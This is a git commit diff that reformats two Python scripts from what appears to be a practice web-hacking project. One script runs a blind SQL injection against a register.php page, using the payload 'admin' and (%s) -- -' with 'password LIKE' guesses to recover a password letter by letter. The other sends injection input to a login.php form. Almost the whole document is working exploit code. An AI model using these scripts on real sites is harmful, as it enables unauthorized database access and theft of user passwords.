d8bdb994995b50e9974111f105dc44743c0a2965
melinda <melindasherrill@socal.rr.com>
2018-05-02 00:12:15 -0700

    modified sql injections

--- python/register_sessions.py
+++ python/register_sessions.py
@@ -1,41 +1,46 @@
 # @author Melinda Sherrill
 # Goes to website, exploits it by iterating through alphabe to get password
 import requests
-import sys
 
-BASEURL = "http://frechetta.me/WebHack/php/register.php"  # Input the URL running the .php file that connects to db
 
+# Input the URL running the .php file that connects to db
+BASEURL = "http://frechetta.me/WebHack/php/register.php"
 SESSION = requests.Session()
 
-TRUE = "Someone already has registered" # Look familar? go to the link above and see
+# Look familar? go to the link above and see
+TRUE = "Someone already has registered"
+
 
 # Gets session url
 def postURL(url, data):
-	return SESSION.post(format(url), data).text
+    return SESSION.post(format(url), data).text
+
 
 # Sends sql injection to the query listed in the php file
 def evaluateCondition(cond):
-	payload = "admin' and (%s) -- -" % cond  # Does this SQL format look familar?
-	response = postURL(BASEURL, {"username" : payload})
+    payload = "admin' and (%s) -- -" % cond
+    response = postURL(BASEURL, {"username": payload})
 
-	#print response
-	return TRUE in response
+    #print response
+    return TRUE in response
 
-def exploitSQL(): # Loops SQL injection 'password LIKE y%' until password is found!
-	password = ""
-	alphabet = "abcdefghijklmnopqrstuvwxyz"
 
-	query = "password LIKE "
-	passthrough = False
-	while(not passthrough):
-		for i in alphabet:
-			format = "'" + password + i + "%" + "'"
-			if evaluateCondition(query + format):
-				password += i
-				print True;
-				break;
-			if i == alphabet[-1]:
-				passthrough = True
-	return password
-	
-print exploitSQL() 
+# Loops SQL injection 'password LIKE y%' until password is found!
+def exploitSQL():
+    password = ""
+    alphabet = "abcdefghijklmnopqrstuvwxyz"
+
+    query = "password LIKE "
+    passthrough = False
+    while(not passthrough):
+        for i in alphabet:
+            format = "'" + password + i + "%" + "'"
+            if evaluateCondition(query + format):
+                password += i
+                print True
+                break
+            if i == alphabet[-1]:
+                passthrough = True
+    return password
+
+print exploitSQL()
--- python/sessions.py
+++ python/sessions.py
@@ -3,23 +3,25 @@
 import requests
 import sys
 
-BASEURL = "http://frechetta.me/WebHack/php/login.php"  # Input the URL running the .php file that connects to db
+# Input the URL running the .php file that connects to db
+BASEURL = "http://localhost/WebHack/php/login.php"
 
 SESSION = requests.Session()
 
-TRUE = "Logged in" # go to link above to see this is on the page
+# go to link above to see this is on the page
+TRUE = "Logged in"
+
 
 # Get's the url and session data
 def postURL(url, data):
-	return SESSION.post(format(url), data).text
+    return SESSION.post(format(url), data).text
+
 
 # Sends payload injection to sql query in login.php
 def evaluateSQL(cond):
-	payload = cond  
-	response = postURL(BASEURL, {"username" : payload})
+    payload = cond
+    response = postURL(BASEURL, {"username": payload, "passname": " "})
+    print response
+    return TRUE in response
 
-	#print response
-	return TRUE in response
-	
 print evaluateSQL(sys.argv[1])
-
